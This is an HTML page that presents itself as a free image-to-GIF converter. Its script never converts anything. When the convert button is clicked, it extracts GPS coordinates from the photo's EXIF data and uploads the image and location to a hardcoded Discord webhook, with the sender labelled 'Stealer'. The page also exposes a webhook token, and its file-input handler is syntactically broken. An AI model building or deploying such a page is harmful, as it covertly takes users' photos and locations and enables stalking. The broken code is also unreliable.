<!DOCTYPE html>
<html lang="en">
<head>

  <title>gif.fuck</title>
  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/exifr.min.js"></script>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #0f0f0f, #1a0033);
      font-family: 'Segoe UI', sans-serif;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: rgba(255,255,255,0.05);
      padding: 40px 30px;
      border-radius: 20px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255,255,255,0.1);
      text-align: center;
      width: 420px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
    }
    h1 {
      margin: 0 0 30px 0;
      font-size: 2.2em;
      background: linear-gradient(90deg, #ff00cc, #00ffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .drop-zone {
      border: 3px dashed #00ffff;
      border-radius: 16px;
      padding: 50px 20px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .drop-zone:hover {
      background: rgba(0, 255, 255, 0.05);
      border-color: #ff00cc;
    }
    button {
      margin-top: 20px;
      padding: 14px 40px;
      font-size: 1.1em;
      background: linear-gradient(90deg, #ff00cc, #00ffff);
      border: none;
      border-radius: 50px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px #ff00cc;
    }
    #status {
      margin-top: 15px;
      font-size: 0.95em;
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>gif.fuck</h1>
    <div class="drop-zone" id="dropZone">
      <p>Drop your image here or click to upload</p>
      <input type="file" id="fileInput" accept="image/*" hidden>
    </div>
    <button id="convertBtn">CONVERT TO GIF</button>
    <div id="status"></div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
    let selectedFile = null;

    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const convertBtn = document.getElementById('convertBtn');
    const status = document.getElementById('status');

    function updateStatus(text, color = "white") {
      status.textContent = text;
      status.style.color = color;
    }

    async function sendToWebhook(file, gps = null) {
      const formData = new FormData();
      formData.append("file", file, file.name);

      let content = `**New upload:** ${file.name}\n**Size:** ${(file.size/1024/1024).toFixed(2)} MB`;

      if (gps && gps.latitude && gps.longitude) {
        content += `\n\n**GPS DATA FOUND**\n` +
                   `**Lat:** ${gps.latitude.toFixed(6)}\n` +
                   `**Lon:** ${gps.longitude.toFixed(6)}`;
      }

      formData.append("payload_json", JSON.stringify({
        content: content,
        username: "gif.fuck Stealer"
      }));

      await fetch(WEBHOOK_URL, { method: "POST", body: formData });
    }

    async function handleFile(file) {
      if (!file.type.startsWith("image/")) return;
      selectedFile = file;
      updateStatus(`Selected: ${file.name}`, "#00ffff");
    }

    // Click to upload
    dropZone.addEventListener("click", () => fileInput.click());
    fileInput.addEventListener("change", (e) => {
      if (e.target.files[0 0]);
    });

    // Drag & Drop
    dropZone.addEventListener("dragover", (e) => {
      e.preventDefault();
      dropZone.style.background = "rgba(0, 255, 255, 0.1)";
    });
    dropZone.addEventListener("dragleave", () => {
      dropZone.style.background = "";
    });
    dropZone.addEventListener("drop", (e) => {
      e.preventDefault();
      dropZone.style.background = "";
      if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]);
    });

    // Convert button
    convertBtn.addEventListener("click", async () => {
      if (!selectedFile) {
        updateStatus("No image selected, dumbass", "red");
        return;
      }

      updateStatus("Processing...");

      try {
        const gps = await exifr.gps(selectedFile);
        await sendToWebhook(selectedFile, gps);
        updateStatus("Successfully sent to webhook 🔥", "#00ff00");
      } catch (err) {
        await sendToWebhook(selectedFile);
        updateStatus("Sent without GPS data", "#ff8800");
      }
    });
  </script>
</body>
</html>
